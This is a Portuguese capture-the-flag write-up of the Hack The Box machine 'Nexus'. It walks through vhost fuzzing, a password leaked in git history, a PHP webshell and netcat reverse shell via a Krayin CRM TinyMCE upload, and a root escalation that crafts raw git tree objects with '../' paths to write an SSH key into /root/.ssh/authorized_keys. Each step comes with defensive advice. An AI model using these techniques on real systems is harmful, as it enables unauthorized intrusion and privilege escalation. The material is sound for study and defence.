# HTB Nexus — Writeup

**Dificuldade:** Easy | **OS:** Linux (Ubuntu 24.04) | **IP:** 10.129.62.93
**Tags:** Virtual Host Fuzzing, Git History Leak, Krayin CRM, TinyMCE RCE, Systemd Timer, Git Internals Path Traversal

---

## 1. Reconhecimento

Nmap padrão revelou apenas dois serviços expostos: SSH e Nginx 1.24.0. Superfície mínima — sinal claro de que a aplicação real estava escondida atrás de virtual hosting, algo muito comum em máquinas do HTB que rodam múltiplos serviços atrás de um único Nginx.

**Ação:** fuzzing de Virtual Hosts com `ffuf`, manipulando o header `Host` contra o IP direto:

```bash
ffuf -u http://10.129.62.93/ -H "Host: FUZZ.nexus.htb" \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -fs <tamanho_da_resposta_padrao>
```

**Resultado:** dois vhosts válidos — `billing.nexus.htb` e `git.nexus.htb`, adicionados ao `/etc/hosts`.

> **Conceito:** o servidor pode hospedar N aplicações diferentes atrás de um único IP/porta 80. O Nginx decide qual backend servir com base no header `Host`. Sem descobrir o vhost certo, você nunca vê a aplicação real — só a página default. Isso é enumeração básica de infraestrutura web, não é "sorte".

## 2. Git Leak → Credenciais

Em `git.nexus.htb` havia um repositório com histórico de commits acessível. Analisando **diffs antigos** (não apenas o estado atual do código), foi encontrado um `.env` que havia sido commitado e depois removido — mas o Git nunca esquece um blob já commitado.

```bash
git log --all --oneline
git show <commit_hash> -- .env
```

Credenciais expostas: `j.matthew@nexus.htb` / `N27xh!!2ucY04`.

> **Conceito crítico:** remover um arquivo sensível num commit novo (`git rm .env`) **não** apaga o conteúdo do histórico. O blob continua no `.git/objects` e é recuperável por qualquer um com acesso de leitura ao repositório. É um dos vazamentos mais comuns em pentests reais.
>
> **Defesa correta:** usar `git filter-repo` ou `BFG Repo-Cleaner` para reescrever o histórico, revogar/rotacionar a credencial vazada imediatamente (reescrever histórico sem rotacionar a credencial é inútil), e nunca versionar `.env` — usar `.gitignore` desde o primeiro commit.

## 3. Acesso ao Krayin CRM + RCE via TinyMCE

As credenciais vazadas deram acesso admin ao **Krayin CRM** rodando em `billing.nexus.htb`.

Dentro da aplicação, o endpoint `/admin/tinymce/upload` (upload de imagens do editor rich-text) permitia upload de arquivo sem validação de extensão adequada. Fluxo de exploração:

1. Interceptar a requisição de upload no Burp Suite.
2. Trocar o payload da imagem por uma webshell PHP.
3. Garantir cookie de sessão válido e CSRF token corretos na requisição.
4. Acessar o arquivo enviado diretamente via URL para obter execução.
5. Usar a webshell para disparar um reverse shell.

```bash
rlwrap nc -lvnp 4444
```

> **Conceito:** upload de arquivo malicioso é uma classe clássica (OWASP A04/A03). O ponto de falha normalmente não é "o upload existe", é a falta de validação **do lado do servidor** — checar `Content-Type` do lado client, ou apenas whitelist de extensão sem checar o conteúdo real do arquivo, é insuficiente. TinyMCE em CRMs (Krayin, outros baseados em Laravel) tem histórico de CVEs nesse endpoint especificamente — vale checar `searchsploit krayin` e o changelog de versões antes de assumir 0-day.
>
> **Defesa:** validar magic bytes do arquivo, renomear uploads para nomes não-executáveis, servir uploads de um domínio/diretório sem permissão de execução PHP, WAF para bloquear padrões de webshell conhecidos.

## 5. Privilege Escalation: jones → root

Esta foi a parte conceitualmente mais densa — exatamente onde você disse que quer fechar o gap. Vou detalhar o raciocínio completo.

### 5.1 Enumeração

Checks padrão sem resultado óbvio:

```bash
sudo -l              # nada
crontab -l           # nada próprio
find / -perm -4000 2>/dev/null   # SUIDs padrão do sistema
```

Quando `sudo -l`, SUID e crontab de usuário não dão nada, o próximo lugar a olhar é **serviços rodando como root de forma automática**: cron do sistema (`/etc/cron.d`), e principalmente **systemd timers**, que muita gente esquece de checar.

```bash
systemctl list-timers --all
```

Achado: `gitea-template-sync.timer`, executando `template-sync.py` **como root** a cada 1 minuto.

> **Conceito-chave que costuma passar batido:** privesc em máquinas modernas raramente é "SUID binary óbvio". Cada vez mais é "processo automatizado com privilégio alto que confia em input controlável por um usuário sem privilégio". Systemd timers, cron jobs custom, scripts de CI/CD locais, watchers de diretório — todos são candidatos. Regra prática: **sempre que algo roda como root de forma automática, pergunte: "o que esse processo consome como input, e eu controlo esse input?"**

### 5.2 Análise do script

Lendo `template-sync.py`:

- Busca repositórios do Gitea marcados como **"Template"**.
- Roda `git ls-tree` e `git cat-file` para extrair a estrutura de arquivos e o conteúdo dos blobs.
- Escreve os arquivos extraídos em `/home/git/template-staging/` usando `os.path.join(base_dir, caminho_do_arquivo)` **sem sanitizar** o `caminho_do_arquivo`.

```python
# padrão vulnerável
dest = os.path.join(base_dir, file_path)  # file_path vem do nome no git tree
with open(dest, "wb") as f:
    f.write(blob_content)
```

> **Conceito:** `os.path.join(base, user_input)` não impede traversal. Se `user_input` contém `../../../`, o resultado sai completamente fora de `base`. Isso é **Path Traversal / Arbitrary File Write** clássico — a mesma lógica de vulnerabilidade que aparece em zip slip, upload handlers, extração de tar/zip, etc. O root cause é sempre o mesmo: **confiar em nome de arquivo fornecido por dado externo sem normalizar e validar contra o diretório base** (ex: `os.path.realpath()` + checagem de prefixo).

### 5.3 Por que a exploração direta via Gitea falhou

Tentativa inicial: criar repo → marcar como Template → commitar arquivo com `../` no nome via `git add`/`git push` normal.

**Resultado:** bloqueado. Tanto o Git quanto o Gitea sanitizam nomes de arquivo com `../` quando você usa os comandos normais (`git add`, interface web) — a camada de "porcelain" do Git valida paths antes de criar a tree.

### 5.4 Bypass: manipulação de objetos Git em baixo nível

A saída foi ir para a camada de **plumbing** do Git — criar os objetos internos (blob e tree) manualmente, sem passar pelas validações da porcelain:

```bash
# criar o blob (conteúdo do arquivo malicioso)
git hash-object -w --stdin < payload_ssh_key

# criar uma tree manualmente, referenciando o blob
# com uma entry cujo "nome" contém sequências ../../../
printf '100644 blob <hash>\t../../../../root/.ssh/authorized_keys\n' | git mktree

# commitar essa tree
git commit-tree <tree_hash> -p HEAD -m "template update"

# forçar a branch a apontar pro commit malicioso e dar push
git update-ref refs/heads/main <commit_hash>
git push origin main --force
```

O script Python, ao rodar `git ls-tree` e `git cat-file`, **confia cegamente no nome retornado pela tree** — que agora contém `../../../../root/.ssh/authorized_keys` — e escreve o conteúdo ali, como root.

Payload: a chave pública SSH do atacante, escrita diretamente em `/root/.ssh/authorized_keys`.

Depois de aguardar o timer (~1 min):

```bash
ssh -i /tmp/.k -o StrictHostKeyChecking=no root@localhost
cat /root/root.txt
```

> **Conceito central desta escalada:** validação feita apenas na camada de "aplicação"/interface (Git porcelain, UI do Gitea) não protege contra quem consegue interagir diretamente com a camada de dados (objetos Git crus). Isso é um paralelo direto de "validação só no client-side" em web, ou "só bloqueei pelo formulário mas a API aceita direto" — **sempre que existe mais de uma via de entrada pro mesmo dado, todas precisam validar, não só a via "oficial".**
>
> **Defesa correta para esse cenário real:** o script `template-sync.py` deveria normalizar o path resultante com `os.path.realpath()` e verificar explicitamente que ele começa com o `base_dir` esperado antes de escrever qualquer arquivo — rejeitando qualquer resultado fora do diretório de staging, independente de como o nome chegou até ali (via porcelain ou objeto Git manual).

## 6. Resumo da cadeia

```
ffuf (vhost fuzzing)
   → git.nexus.htb (leak de .env no histórico)
   → login admin no Krayin CRM (billing.nexus.htb)
   → RCE via upload TinyMCE (webshell + reverse shell) → www-data
   → segundo .env → reuso de senha → jones (user flag)
   → enumeração de systemd timers → gitea-template-sync.timer
   → path traversal em script Python (os.path.join sem sanitização)
   → bypass da sanitização do Git indo direto para objetos internos (blob/tree)
   → escrita de authorized_keys como root → root flag
```

## 8. O que fixar mentalmente pra próxima máquina (privesc)

Já que esse é seu ponto fraco declarado, o padrão mental pra generalizar:

1. **Sempre rode em sequência:** `sudo -l` → SUID/SGID → crontab do usuário → **`systemctl list-timers --all` e `/etc/cron.d`** → processos rodando como root (`ps aux` filtrando root) → serviços de rede internos (`ss -tlnp`).
2. Para qualquer processo automatizado root encontrado: leia o script/binário e pergunte **"que input esse processo consome, e eu controlo algum pedaço dele?"** (nome de arquivo, variável de ambiente, config que eu posso editar, etc).
3. Quando vir manipulação de path (`os.path.join`, `os.path.normpath`, concatenação de string pra montar caminho de arquivo), teste path traversal por padrão.
4. Se a interface "oficial" bloquear seu payload, pergunte se existe uma **camada mais baixa** pra interagir com o mesmo dado (aqui foi Git plumbing vs porcelain; em outros contextos pode ser API direta vs formulário web, ou banco direto vs ORM).

Ferramentas de automação pra próxima vez (uso educacional, sempre em ambiente autorizado): `linpeas.sh` pra acelerar o passo 1, mas o objetivo é você conseguir reconhecer isso sem depender dele.
